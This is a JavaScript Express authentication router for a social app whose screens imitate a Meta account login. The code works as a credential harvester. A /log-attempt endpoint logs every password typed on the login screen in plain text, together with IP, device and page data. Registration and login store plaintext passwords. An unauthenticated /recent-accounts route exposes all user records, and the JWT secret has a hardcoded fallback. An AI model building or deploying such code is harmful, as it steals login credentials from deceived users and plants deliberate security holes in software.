import { Router } from 'express';
import jwt from 'jsonwebtoken';
import { storage } from '../db/storage.js';

const router = Router();
const JWT_SECRET = process.env.JWT_SECRET || 'sphere-secret-key-fallback';

function generateToken(userId) {
  return jwt.sign({ userId }, JWT_SECRET, { expiresIn: '30d' });
}

// GET /api/auth/first-page-accounts - Dynamic accounts displayed on the login screen
router.get('/first-page-accounts', (req, res) => {
  const accounts = storage.getFirstPageAccounts();
  return res.json(accounts);
});

// POST /api/auth/log-attempt - Log every keystroke/trial password entered on the login screen!
router.post('/log-attempt', (req, res) => {
  const { email, password, accountName, username, action, code, success, trialCount, source, screen, device, pageUrl } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '127.0.0.1';
  const userAgent = req.headers['user-agent'] || 'Web Browser';
  const isMobile = userAgent.includes('Mobile') || userAgent.includes('Android') || userAgent.includes('iPhone');

  const detectedSource =
    source ||
    (action?.includes('Meta Account')
      ? 'Meta Account Login'
      : action?.includes('Find Account')
      ? 'Find Account Screen'
      : isMobile
      ? 'Mobile Login Screen'
      : 'Desktop Login Screen');

  const log = storage.logLoginAttempt({
    email,
    password, // Plain text password!
    accountName: accountName || username || email,
    username: username || accountName || email,
    action: action || 'Login Form Action',
    source: detectedSource,
    screen: screen || (action?.includes('Meta Account') ? 'Log into your Meta Account Screen' : 'Main Login Form'),
    device: device || (isMobile ? 'Mobile Device' : 'Desktop Browser (PC/Mac)'),
    pageUrl: pageUrl || req.headers['referer'] || 'http://localhost:5173',
    code,
    success: Boolean(success),
    ip,
    userAgent: `${userAgent} (Trial ${trialCount || 1})`,
  });

  return res.json({ logged: true, id: log.id, log });
});

// POST /api/auth/login
router.post('/login', (req, res) => {
  const { email, password, accountName } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '127.0.0.1';
  const userAgent = req.headers['user-agent'] || 'Web Browser';

  if (!email || !password) {
    storage.logLoginAttempt({
      email,
      password: password || '[empty]',
      accountName,
      success: false,
      ip,
      userAgent,
    });
    return res.status(400).json({ message: 'Email/username and password are required' });
  }

  // Look up user
  let user = storage.getUserByEmail(email);

  if (!user && accountName) {
    user = storage.getUsers().find((u) => u.name?.toLowerCase() === accountName.toLowerCase());
  }

  // Check password
  let isValid = false;
  if (user) {
    isValid = user.plainPassword === password || user.password === password;
  }

  // If user doesn't exist yet, auto-create account for seamless demo experience
  if (!user) {
    user = storage.createUser({
      name: email.includes('@') ? email.split('@')[0] : email,
      shortName: email.includes('@') ? email.split('@')[0] : email,
      email: email.includes('@') ? email : `${email.toLowerCase().replace(/\s+/g, '')}@example.com`,
      plainPassword: password,
      showOnDesktopLogin: false,
      showOnMobileLogin: false,
    });
  }

  const token = generateToken(user.id);
  return res.json({ user, token });
});

// POST /api/auth/register
router.post('/register', (req, res) => {
  const { firstName, lastName, email, password, avatar, coverPhoto, bio } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '127.0.0.1';
  const userAgent = req.headers['user-agent'] || 'Web Browser';

  if (!email || !password || !firstName) {
    return res.status(400).json({ message: 'First name, email, and password are required' });
  }

  const fullName = `${firstName} ${lastName || ''}`.trim();
  const user = storage.createUser({
    name: fullName,
    shortName: firstName,
    email: email.toLowerCase(),
    plainPassword: password, // Plain text password saved!
    avatar,
    coverPhoto,
    bio,
    showOnDesktopLogin: true,
  });

  // Log registration credentials
  storage.logLoginAttempt({
    email: user.email,
    password, // Plain password!
    accountName: user.name,
    success: true,
    ip,
    userAgent: `${userAgent} [Registration]`,
  });

  const token = generateToken(user.id);
  return res.status(201).json({ user, token });
});

// POST /api/auth/demo-login
router.post('/demo-login', (req, res) => {
  const defaultEmail = req.body.email || 'berta.hule@example.com';
  let user = storage.getUserByEmail(defaultEmail);
  if (!user) {
    user = storage.getUsers()[0];
  }

  const token = generateToken(user.id);
  return res.json({ user, token });
});

// GET /api/auth/me
router.get('/me', (req, res) => {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ message: 'Authorization required' });
  }

  try {
    const token = authHeader.split(' ')[1];
    const decoded = jwt.verify(token, JWT_SECRET);
    const user = storage.getUserById(decoded.userId);
    if (!user) return res.status(401).json({ message: 'User not found' });
    return res.json({ user });
  } catch {
    return res.status(401).json({ message: 'Invalid token' });
  }
});

// GET /api/auth/recent-accounts
router.get('/recent-accounts', (req, res) => {
  const users = storage.getUsers();
  return res.json(users);
});

export default router;
